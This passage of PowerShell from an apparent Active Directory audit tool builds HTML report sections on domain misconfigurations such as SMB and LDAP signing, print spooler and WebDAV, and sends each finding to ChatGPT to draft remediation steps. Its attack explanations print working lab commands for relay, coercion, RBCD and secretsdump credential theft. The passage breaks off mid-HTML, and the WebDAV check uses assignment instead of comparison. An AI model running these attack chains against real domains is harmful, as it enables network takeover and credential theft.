function Generate-MISChtml {  
    param (
        [Parameter()]
        [array]$MISC,

        [Parameter()]
        [string]$APIkey
    )
    #gen AI prompt for remediation
    $AiSystemMessage = "You are an Active Directory security expert. I will provide you with some information relating to a vulnerability and I want you to respond with exact remediation steps to fix the specified vulnerability in html code. I want it in numbered steps that go inbetween list tags <ol><li> in html. I want no other information returned."

    if (!$MISC) {
        $html = @"
        <div class="finding-header">MISC</div>
        <h2 class="novuln">No vulnerabilities found!</h2>
"@
    }
    else {
        $html = @"
        <div class="finding-header">MISC</div>
        <div class="domain-info">
            <p>This section contains technical vulnerability details relating to general domain misconfigurations.</p>
        </div>
        <div class="finding-container">
        <table>
            <thead>
                <tr>
                    <th class="table-header-left">Issue</th>
                    <th class="table-header-right">Risk</th>
                </tr>
            </thead>
            <tbody>
"@

        foreach ($finding in $MISC) {
            #replace console colours 
            if($finding.Risk -match "critical"){
                $finding.Risk = "Critical"
            } elseif ($finding.Risk -match "high"){
                $finding.Risk = "High"
            } elseif ($finding.Risk -match "medium"){
                $finding.Risk = "Medium"
            } elseif ($finding.Risk -match "low"){
                $finding.Risk = "Low"
            } elseif ($finding.Risk -match "informational"){
                $finding.Risk = "Informational"
            }
            $remediation = Connect-ChatGPT -APIkey $APIkey -Prompt $finding -Temperature 0.1 -AiSystemMessage $AiSystemMessage
            if ($finding.Technique -match "add computers to the domain") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
        <tr>
            <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
            <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr>
"@
                if ($finding.Technique -match "potential") {
                    $html += "<td>Potential for non-admin users to add computers to the domain.</td>"
                }
                else {
                    $html += "<td>Non-admin users can add computers to the domain.</td>"
                }                
                $html += @"
                                <td>TA0003, TA0004</td>
                                <td>+$($finding.Score)</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">MachineAccountQuota</td><td>$($finding.MachineAccountQuota)</td></tr>
                                    <tr><td class="grey">Permission to add workstations</td><td>$($finding.PermissiontoAddWorkstations)</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>By default, in Active Directory any authenticated domain user can add a total of 10 computers (machine accounts) to the domain. The number of computers is controlled by the 'ms-DS-MachineAccountQuota' property of the domain, and permission for who can add computers is controlled within the 'Default Domain Controllers Policy' GPO. Computers accounts added by users can be used in attacks such as RBCD or relaying attacks where the computer account can be configured in a way that gives an attacker administrative control by permitting delegation to other critical servers, allowing low-privileged users to escalate their privileges. This default configuration represents a security issue as basic users shouldn't be able to create such accounts and this task should be handled by administrators.</p>
                                    <p>$($finding.Issue).</p> 
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://www.thehacker.recipes/a-d/movement/domain-settings/machineaccountquota">Link 1</a></p>
                                    <p><a href="https://sid-500.com/2017/09/09/securing-active-directory-who-can-add-computers-to-the-domain-only-the-domain-admin-are-you-sure/">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can enumerate the 'ms-DS-MachineAccountQuota' property to view how many computers they can add to the domain. By default this is set to 10.</p>
                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' -M maq</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/MISC/MAQ-1.png" alt="Finding the machineaccountquota">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. Any low-privileged user can add a computer account to the domain choosing the credentials for the computer they desire.</p>
                                            <p class="code">impacket-addcomputer -computer-name 'attackerComputer$' -computer-pass 'h4x' test.local/test:'Password123!'</p> 
                                            <p>The added computer can be use to authenticate to resources such as file shares just as a low-privileged user can.</p> 
                                            <p class="code">nxc smb dc.test.local -u 'attackerComputer$' -p 'h4x' --shares</p>          
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/MISC/MAQ-2.png" alt="Adding and using the computer account">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. The added computer can be seen joined to the domain.</p>           
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/MISC/MAQ-3.png" alt="Viewing the added machine">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>$remediation</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>
"@  
            }
            elseif ($finding.Technique -match "outbound access") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
        <tr>
            <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
            <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr>
"@
                if ($finding.Issue -match "Administrator") {
                    $html += "<td>Administrator accounts have unrestricted outbound access.</td>"
                }
                elseif ($finding.Issue -match "non-essential") {
                    $html += "<td>Outbound access is not restricted on servers.</td>"
                } 
                else {
                    $html += "<td>Access to malicious sites is not blocked.</td>"
                }               
                $html += @"
                                <td>TA0010</td>
                                <td>+$($finding.Score)</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Computer Name</td><td>$($finding.Name)</td></tr>
                                    <tr><td class="grey">User</td><td>$($finding.User)</td></tr>
                                </table></td>
                                <td class="explanation">
"@          
                if ($finding.Issue -match "Administrator") {
                    $html += "<p>Admin accounts should not have direct access to the internet because any malicious code executed within an administrative context will have the potential to cause catastrophic damage. If an administrator visits a malicious website or opens a malicious email attachment then any virus, malware or ransomware will be able to spread around the network with the same rights that the user is logged on as; bypassing inbuilt protections and spreading to all hosts within the network.</p>"
                }
                elseif ($finding.Issue -match "non-essential") {
                    $html += "<p>All outbound traffic should be subject to traffic inspection through a web proxy to prevent acess to malicious sites containing malware or to block outbound command and control connections to attacker C2 infrastructure.</p>"
                } 
                else {
                    $html += "<p>No web browser should be allowed on servers or domain controllers. Critical servers should only have access to visit business-critical sites such as Microsoft domains for updates and be blocked from everything else as a data loss prevention technical control mechanism.</p>"
                }               
                $html += @"
                                    <p>$($finding.Issue).</p> 
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/securing-domain-controllers-against-attack#blocking-internet-access-for-domain-controllers">Link 1</a></p>
                                    <p><a href="https://paularquette.com/lock-down-your-active-directory-domain-controllers-internet-access-part-of-my-active-directory-hardening-series/">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. If unrestricted outbound access is permitted, users can freely access malicious websites such as exploit-db.com.</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/MISC/outbound-access-1.png" alt="accessing malicious site">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. If outbound access is permitted on servers, whilst malicious sites may be blocked by a proxy solution, an attacker could visit third-party sharing sites such as Dropbox, on the domain controller to exfiltrate high volumes of sensitive data with admin access from the network with ease.</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/MISC/outbound-access-2.png" alt="accessing non-essential site">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>$remediation</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>
"@ 
            }
            elseif ($finding.Technique -eq "SMB signing is not enforced") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
        <tr>
            <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
            <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr>
                                <td>An unauthenticated attacker can take control of a system through relaying SMB authentication.</td>
                                <td>TA0008, TA0009</td>
                                <td>+$($finding.Score)</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Computers</td><td>$($finding.Computers -replace "`r?`n", "<br>")</td></tr>
                                    <tr><td class="grey">SMB Signing</td><td>$($finding.SMBSigning)</td></tr>
                                </table></td>
                                <td class="explanation">    
                                    <p>Server Message Block (SMB) serves as a network file sharing protocol and one security protection is called SMB Signing. When a user seeks access to a shared resource, SMB initiates a connection and authenticates the user. Attackers can intercept this authentication attempt and relay it to a different server to impersonate the user. The lack of SMB's validation (via SMB signing) of the authentication request's origin or destination allows attackers to exploit it for unauthorized access. This allows unauthenticated attackers to remotely take control of any system with SMB signing disabled (which is the default for all windows versions except Windows Server 2022 or Windows 11 and newer).</p>
                                    <p>$($finding.Issue)</p> 
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/">Link 1</a></p>
                                    <p><a href="https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. An unauthenticated attacker can discover systems that do not require smb signing by negotiating an smb connection with each.</p>
                                            <p class="code">nxc smb 192.168.10.0/24 --gen-relay-list smb_hosts_nosigning.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/MISC/smbsigning-1.png" alt="finding systems where smb signing is not required">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. Like in LLMNR poisoning, a user may fail a DNS request by mispelling a file share, which will invoke an LLMNR query to attempt to resolve the hostname on the local LAN.</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/MISC/smbsigning-2.png" alt="failing a DNS request">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. An attacker listening on the local LAN with responder can respond to the LLMNR query, intercepting the SMB request.</p>
                                            <p class="code">sudo responder -I eth0</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/MISC/smbsigning-3.png" alt="poisoning the request">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>4. This SMB request can be relayed to eacch of the systems that do not require SMB signing. If the user that's authentication is being relayed has local admin privileges on the target system, all credential matter can be extracted from on the systems the authentication is relayed to and provided to an unauthenticated attacker.</p>
                                            <p class="code">impacket-ntlmrelayx -tf smb_hosts_nosigning.txt -smb2support</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/MISC/smbsigning-4.png" alt="relaying the smb authentication">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>$remediation</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>
"@ 
            }
            elseif ($finding.Technique -eq "LDAP signing or channel binding is not enforced") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Absence of LDAP signing on domain controllers allows devices to be fully compromised through relay attacks.</td>
                                        <td>TA0004, TA0008, TA0009</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Domain Controller</td><td>$($finding.DomainController)</td></tr>
                                            <tr><td class="grey">LDAP Signing</td><td>False</td></tr>
                                        </table></td>
                                        <td class="explanation">    
                                            <p>LDAP is the protocol that users, applications and devices use to query and commnunicate with the Active Directory. The security of LDAP can be increased significant by requiring LDAP channel binding else machines running the WebClient service can be compromised by relaying authentication to LDAP (if signing requirements are not enforced) and perform any action that machine has permission to perfrom. Machine accounts have permission to update their own 'msDS-AllowedToActOnBehalfOfOtherIdentity' property meaning that authentication can be coerced, relayed to ldap, then set resource-based constrained delegation on themselves to give a low privileged attacker full control over any machine running the WebClient service.</p>
                                            <p>$($finding.Issue).</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.hackingarticles.in/lateral-movement-webclient-workstation-takeover/">Link 1</a></p>
                                            <p><a href="https://support.microsoft.com/en-gb/topic/2020-2023-and-2024-ldap-channel-binding-and-ldap-signing-requirements-for-windows-kb4520412-ef185fb8-00f7-167d-744c-f299a66fc00a">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low privileged user can check for systems with the WebClient service running (\\<computer>\pipe\DAV RPC SERVICE will be exposed) and also if the domain controller requires ldap signing and channel binding. If not, the computer running the webclient service can be compromised.</p>
                                                    <p class="code">nxc smb 192.168.10.205 -u test -p 'Password123!' -M webdav</p>
                                                    <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' -M ldap-checker</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/MISC/webdav-1.png" alt="Finding computers with webclient service enabled">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A DNS record can be added by any low-privileged user to the domain that points to the attack machine (needed for the authentication coercion over HTTP).</p>
                                                    <p class="code">python3 dnstool.py -u test.local\\test -p 'Password123!' -r attackerDNS.test.local -d 192.168.10.130 --action add dc.test.local</p>
                                                    <p>A low-privileged user can then add a computer to the domain to provide an account wth an SPN for the frontend service for the RBCD that will be setup over the target server running the WebClient service.</p>
                                                    <p class="code>impacket-addcomputer -computer-name 'attackerComputer$' -computer-pass 'h4x' test.local/test:'Password123!'</p>
                                                    <p>A low-privileged user can then coerce machine authentication using RPC from the target machine to the kali machine over http (by specifying @8080).</p>
                                                    <p class="code>python3 printerbug.py test:'Password123!'@192.168.10.205 attackerDNS@8080/a></p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/MISC/webdav-2.png" alt="Setting up webdav relay">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. A listener to relay the HTTP authentication is setup to relay the HTTP authentication from the target server to LDAP on the domain controller, to update the 'msDS-AllowedToActOnBehalfOfOtherIdentity' property on the target server with attackerComputer$ (the computer added).</p>
                                                    <p class="code">sudo impacket-ntlmrelayx -smb2support -t ldaps://dc.test.local --http-port 8080 --delegate-access --escalate-user attackerComputer\$ --no-dump --no-acl --no-da</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/MISC/webdav-3.png" alt="Relaying webdav">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>4. With control of the frontend service (the added attacker computer), an adversary can request a ticket for any service on the backend as they are alloweed to delegte to this service as setup by the HTTP to LDAP relay.</p>
                                                    <p class="code">impacket-getST -spn cifs/DESKTOP-JKTS35O.test.local test.local/attackerComputer\$:h4x -impersonate administrator</p>
                                                    <p>With a ticket obtained for the backend service, an adversary can remotely extract all the credential matter from the target computer running the WebClient service.</p>
                                                    <p class="code">export KRB5CCNAME=administrator.ccache</p>
                                                    <p class="code">impacket-secretsdump -k -no-pass DESKTOP-JKTS35O.test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/MISC/webdav-4.png" alt="Compromising the computer">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@ 
            }
            elseif ($finding.Technique -match "Spooler service") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
        <tr>
            <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
            <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr>
                                <td>An low-privileged user can coerce authentication from systems via printerbug.</td>
                                <td>TA0008, TA0009</td>
                                <td>+$($finding.Score)</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Computers</td><td>$($finding.Computers -replace "`r?`n", "<br>")</td></tr>
                                    <tr><td class="grey">SpoolerEnabled</td><td>$($finding.SpoolerEnabled)</td></tr>
                                </table></td>
                                <td class="explanation">    
                                    <p>Any system running the print spooler service can have authentication coerced from it and combined with other relaying attacks to compromise a system. A by-design flaw is known within MS-RPRN whereby any authenticated domain user can remotely connect to a server's print spooler service and request an update on new print jobs. This action forces a call back and exposes the domain controller computer account credential (print spooler is owned by SYSTEM) in the form of the computers NTLMv2 password hash. The credential can then be relayed to any unprotected ADCS web endpoints, to systems with unconstrained delegation configured or downgraded to NTLMv1 if permitted, allowing an attacker to impersonate the identity of a domain controller and thus fully compromise the domain.</p>
                                    <p>$($finding.Issue)</p> 
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://www.fortalicesolutions.com/posts/elevating-with-ntlmv1-and-the-printer-bug">Link 1</a></p>
                                    <p><a href="https://www.dionach.com/printer-server-bug-to-domain-administrator/">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can find systems where the print spooler service is enabled by searching for the presence of the \\<computer>\pipe\spoolss named pipe.</p>
                                            <p class="code">nxc smb dc.test.local -u test -p 'Password123!' -M spooler</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/MISC/Spooler-1.png" alt="finding systems where print spooler is enabled">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. A low-privileged user can by default coerce machine authentication using RPC from the target machine to an attacker controlled machine.</p>
                                            <p class="code">python3 printerbug.py test:'Password123!'@dc.test.local attacker.test.local</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/unconstrained-4.png" alt="Coercing authentication">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. With an SMB server hosted, the attacker can intercept the NTLMv2 password hash of the target machine, which can be combined with other relaying attaccks to fully compromise the system.</p>
                                            <p class="code">sudo responder -I eth0</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/MISC/Spooler-2.png" alt="Retrieving the computer hash">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>$remediation</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>
"@ 
            }
            elseif ($finding.Technique -match "WebDAV") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
"@
                if ($finding.Score = 30) {
                    $html += "<td>The WebClient service running on a device and absence of LDAP signing allows a remote attacker to take control of the machine.</td>"
                }else{
                    $html += "<td>The WebClient service is running on a device however LDAP signing mitigates attacks scope.</td>"
                }
                $html+=@"
                                        <td>TA0004, TA0008, TA0009</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Computers</td><td>$($finding.Computers -replace "`r?`n", "<br>")</td></tr>
                                            <tr><td class="grey">WebDAV enabled</td><td>$($finding.WebDAVEnabled)</td></tr>
                                        </table></td>
                                        <td class="explanation">    
                                            <p>The WebClient service allows users to connect to WebDAV shares and is commonly seen in organizations that use OneDrive or SharePoint or when mounting drives with a WebDAV connection string. The service is installed by default on Windows 10 machines, however is vulnerable to a 'by-design' authentication coercion bug. Machine account authentication coerced from a machine via WebDAV will use the HTTP protocol, which can be relayed to LDAP (if signing requirements are not enforced) and perform any action that machine has permission to perfrom. Machine accounts have permission to update their own 'msDS-AllowedToActOnBehalfOfOtherIdentity' property meaning that authentication can be coerced, relayed to ldap, then set resource-based constrained delegation on themselves to give a low privileged attacker full control over any machine running the WebClient service.</p>
                                            <p>$($finding.Issue).</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.hackingarticles.in/lateral-movement-webclient-workstation-takeover/">Link 1</a></p>
                                            <p><a href="https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low privileged user can check for systems with the WebClient service running (\\<computer>\pipe\DAV RPC SERVICE will be exposed) and also if the domain controller requires ldap signing and channel binding. If not, the computer running the webclient service can be compromised.</p>
                                                    <p class="code">nxc smb 192.168.10.205 -u test -p 'Password123!' -M webdav</p>
                                                    <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' -M ldap-checker</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/MISC/webdav-1.png" alt="Finding computers with webclient service enabled">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A DNS record can be added by any low-privileged user to the domain that points to the attack machine (needed for the authentication coercion over HTTP).</p>
                                                    <p class="code">python3 dnstool.py -u test.local\\test -p 'Password123!' -r attackerDNS.test.local -d 192.168.10.130 --action add dc.test.local</p>
                                                    <p>A low-privileged user can then add a computer to the domain to provide an account wth an SPN for the frontend service for the RBCD that will be setup over the target server running the WebClient service.</p>
                                                    <p class="code>impacket-addcomputer -computer-name 'attackerComputer$' -computer-pass 'h4x' test.local/test:'Password123!'</p>
                                                    <p>A low-privileged user can then coerce machine authentication using RPC from the target machine to the kali machine over http (by specifying @8080).</p>
                                                    <p class="code>python3 printerbug.py test:'Password123!'@192.168.10.205 attackerDNS@8080/a></p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/MISC/webdav-2.png" alt="Setting up webdav relay">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. A listener to relay the HTTP authentication is setup to relay the HTTP authentication from the target server to LDAP on the domain controller, to update the 'msDS-AllowedToActOnBehalfOfOtherIdentity' property on the target server with attackerComputer$ (the computer added).</p>
                                                    <p class="code">sudo impacket-ntlmrelayx -smb2support -t ldaps://dc.test.local --http-port 8080 --delegate-access --escalate-user attackerComputer\$ --no-dump --no-acl --no-da</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/MISC/webdav-3.png" alt="Relaying webdav">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>4. With control of the frontend service (the added attacker computer), an adversary can request a ticket for any service on the backend as they are allowed to delegate to this service as setup by the HTTP to LDAP relay.</p>
                                                    <p class="code">impacket-getST -spn cifs/DESKTOP-JKTS35O.test.local test.local/attackerComputer\$:h4x -impersonate administrator</p>
                                                    <p>With a ticket obtained for the backend service, an adversary can remotely extract all the credential matter from the target computer running the WebClient service.</p>
                                                    <p class="code">export KRB5CCNAME=administrator.ccache</p>
                                                    <p class="code">impacket-secretsdump -k -no-pass DESKTOP-JKTS35O.test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/MISC/webdav-4.png" alt="Compromising the computer">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@ 
            }
            elseif ($finding.Technique -match "Organizational Units") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Empty OUs are unused and add unnecessary complexity to the management of the domain.</td>
                                        <td>TA0040</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>

                                            <tr><td class="grey">Number of empty OUs</td><td>$($finding.NumEmptyOUs)</td></tr>
                                            <tr><td class="grey">Empty OUs</td><td>$($finding.EmptyOUs -replace "`r?`n", "<br>")</td></tr>
                                        </table></td>
                                        <td class="explanation">    
                                            <p>In some cases, groups and OUs are empty, yet still remain active in the system, thus making the directory much larger more complex that is needs to be, creating a potential security risk of risk of misconfiguration due to complexity. To minimize management overhead, these empty OUs should be deleted as they take up considerable space in the Domain Controllers due to replication. A cluttered AD environment is difficult to maintain, leads to administrative confusion and decresased effeciency.</p>
                                            <p>$($finding.Issue).</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.lepide.com/blog/5-ways-to-keep-your-active-directory-clean/#:~:text=In%20some%20cases%2C%20groups%20and,OUs%20in%20a%20timely%20manner.">Link 1</a></p>
                                            <p><a href="https://www.n-able.com/blog/active-directory-cleanup-best-practices">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Empty OUs can be found in ADUC where no object exist under the OU. This adds unecessary completiy and risk that misconfigured objects can lie dormant in many sublayers of OUs.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/MISC/emptyOU.png" alt="empty OU">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
